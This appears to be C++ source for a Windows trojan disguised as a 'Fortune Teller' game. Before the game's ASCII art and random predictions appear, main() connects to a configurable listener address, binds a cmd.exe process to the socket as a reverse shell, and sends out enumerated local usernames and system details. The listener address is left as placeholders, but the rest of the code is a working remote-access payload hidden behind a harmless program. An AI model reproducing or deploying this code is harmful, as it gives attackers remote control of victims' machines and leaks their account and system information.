#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <iostream>
#include <sstream>
#include <Ws2tcpip.h>
#include <vector>
#include <lm.h>
#include <locale>
#include <codecvt>
#include <Windows.h>
#include <VersionHelpers.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma warning(disable : 4267)

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16] = "<listenerip>";
char port[6] = "<listenerport";

STARTUPINFOA ini_processo;
PROCESS_INFORMATION processo_info;

std::string WideStringToUTF8(const std::wstring& wideStr)
{
    std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
    return converter.to_bytes(wideStr);
}

void EnumerateUsers(std::ostream& output)
{
    DWORD resumeHandle = 0;
    DWORD entriesRead = 0;
    DWORD totalEntries = 0;
    USER_INFO_1* userInfo = nullptr;
    std::vector<std::wstring> usernames;

    output << " User Information" << std::endl;
    output << " ------------------" << std::endl;

    // Perform user enumeration
    DWORD result = NetUserEnum(nullptr, 1, FILTER_NORMAL_ACCOUNT, reinterpret_cast<LPBYTE*>(&userInfo),
        MAX_PREFERRED_LENGTH, &entriesRead, &totalEntries, &resumeHandle);

    if (result == NERR_Success || result == ERROR_MORE_DATA)
    {
        for (DWORD i = 0; i < entriesRead; ++i)
        {
            usernames.push_back(userInfo[i].usri1_name);

            // Get user information
            USER_INFO_4* userInfo4 = nullptr;
            result = NetUserGetInfo(nullptr, userInfo[i].usri1_name, 4, reinterpret_cast<LPBYTE*>(&userInfo4));
            if (result == NERR_Success)
            {
                output << " Username: " << std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(userInfo4->usri4_name) << std::endl;
                output << " Administrator: " << ((userInfo4->usri4_flags & UF_ACCOUNTDISABLE) ? "No" : "Yes") << std::endl;

                NetApiBufferFree(userInfo4);
            }
            else
            {
                output << " Failed to retrieve user information. Error code: " << result << std::endl;
            }
        }
    }
    else
    {
        output << " Failed to enumerate users. Error code: " << result << std::endl;
    }

    // Free the user info buffer
    if (userInfo != nullptr)
    {
        NetApiBufferFree(userInfo);
    }



}

void EnumerateSystemInformation(std::ostream& output)
{
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    output << " System Information" << std::endl;
    output << " ------------------" << std::endl;
    output << " Processor Architecture: ";
    switch (systemInfo.wProcessorArchitecture)
    {
    case PROCESSOR_ARCHITECTURE_INTEL:
        output << "x86 (Intel)" << std::endl;
        break;
    case PROCESSOR_ARCHITECTURE_AMD64:
        output << "x64 (AMD or Intel)" << std::endl;
        break;
    case PROCESSOR_ARCHITECTURE_ARM:
        output << "ARM" << std::endl;
        break;
    default:
        output << "Unknown" << std::endl;
        break;
    }

    output << " Processor Type: " << systemInfo.dwProcessorType << std::endl;
    output << " Number of Processors: " << systemInfo.dwNumberOfProcessors << std::endl;


    // Print the operating system and its version
    output << " Operating System: Windows " << std::endl;
    if (IsWindows10OrGreater())
    {
        output << "  Version: Windows 10 or later" << std::endl;
    }
    else if (IsWindows8OrGreater())
    {
        output << "  Version: Windows 8 or later" << std::endl;
    }
    else if (IsWindows7OrGreater())
    {
        output << "  Version: Windows 7 or later" << std::endl;
    }
    else if (IsWindowsVistaOrGreater())
    {
        output << "  Version: Windows Vista or later" << std::endl;
    }
    else if (IsWindowsXPOrGreater())
    {
        output << "  Version: Windows XP or later" << std::endl;
    }
    else
    {
        output << "  Version: Unknown" << std::endl;
    }




    // Print a separator line
    output << "---------------------------------" << std::endl;

}



int fortune()
{
    std::srand(static_cast<unsigned int>(std::time(0))); //seed for pseudo-random generator srand(), has to run once per program run

    char predictions[][90]{  //predictions in multidimensional array
        "you sitting in the dark typing lots of lines of code on your computer.",
        "you laughing your lungs out.",
        "you enjoying the sun.",
        "fortune favors the brave.",
        "now is the time to try something new.",
        "what ever you're goal is in life, embrace it visualize it, and for it will be yours.",
        "your shoes will make you happy today.",
        "if winter comes, can spring be far behind?",
        "joys are often the shadows, cast by sorrows.",
        "our deeds determine us, as much as we determine our deeds.",
        "you will conquer obstacles to achieve success.",
        "when fear hurts you, conquer it and defeat it!",
        "wealth awaits you very soon.",
        "serious trouble will bypass you.",
        "meeting adversity well is the source of your strength.",
        "happiness may be right under your nose.",
        "your fondest dream will come true within this year."

    };

    bool end{ false };

    const int max_length{ 15 };  
    char name[max_length]{};

    std::cout << R"(  
     ____         __                  ______    ____       
    / __/__  ____/ /___ _____  ___   /_  __/__ / / /__ ____
   / _// _ \/ __/ __/ // / _ \/ -_)   / / / -_) / / -_) __/
  /_/  \___/_/  \__/\_,_/_//_/\__/   /_/  \__/_/_/\__/_/                                                                                                         
    )" << '\n';

    std::cout << R"(
                     .---.
                   .'_..._'.
                  .''_   _''.
                 .' :  '  : '.
                .'_.-'_~_'-._'.
               .'(     '     )'.
              .'  \ \     / /  '.
             .'    \ \   / /    '.
       ____________'''` '```____________
      /              .''.               \
     /              (  ` )               \
    /               .'..'.                \
   /                '----'                 \
  /_________________________________________\
    \  /'--'                       '--'\  /
     ||                                 ||
     ||                                 ||
    _||_                               _||_
    '--'                               '--'
    )" << '\n';

    std::cout << " Please provide your name :" << std::endl;

    std::cin.getline(name, max_length);

    while (!end)
    {
        std::cout << " Oh " << name << ", I see ";

        size_t rand_num = static_cast<size_t>((std::rand() % std::size(predictions))); //generates number between 0 and the outer number of the array
        std::cout << predictions[rand_num] << std::endl;

        std::cout << " Do you want to try again? (Y | N) : " << std::endl;

        char go_on;
        std::cin >> go_on;

        end = ((go_on == 'Y') || (go_on == 'y')) ? false : true;
    }

    std::cout << " That's all I have for you today. Best wishes! " << std::endl;

    return 0;
}



int main()
{
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0)
    {
        std::cout << "WSAStartup failed with error code: " << result << std::endl;
        return 1; // Return an error code indicating the failure
    }

    Winsock = static_cast<int>(WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0));

    struct addrinfo* addrResult = NULL;
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    int res = getaddrinfo(ip_addr, NULL, &hints, &addrResult);

    if (res != 0)
    {
        std::cout << "getaddrinfo failed with error: " << res << std::endl;
        WSACleanup(); // Clean up Winsock
        return 1; // Return an error code indicating the failure
    }

    inet_ntop(AF_INET, &(((struct sockaddr_in*)(addrResult->ai_addr))->sin_addr), ip_addr, 16);

    freeaddrinfo(addrResult);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    inet_pton(AF_INET, ip_addr, &(hax.sin_addr));

    result = WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    if (result == SOCKET_ERROR)
    {
        std::cout << "WSAConnect failed with error code: " << WSAGetLastError() << std::endl;
        closesocket(Winsock);
        WSACleanup();
        return 1;
    }

    ZeroMemory(&ini_processo, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    char cmd[255] = "cmd.exe";

    CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    // Call the EnumerateUsers function to perform user enumeration
    std::stringstream ss;
    EnumerateUsers(ss);

    // Print separator line
    ss << "---------------------------------" << std::endl;

    // Call the EnumerateSystemInformation function to retrieve system information
    EnumerateSystemInformation(ss);

    // Send the output of EnumerateUsers and EnumerateSystemInformation to ip_addr & port
    std::string output = ss.str();
    send(Winsock, output.c_str(), output.length(), 0);

    // Call the fortune function to perform the fortune-telling
    fortune();

    closesocket(Winsock);
    WSACleanup();

    return 0;
}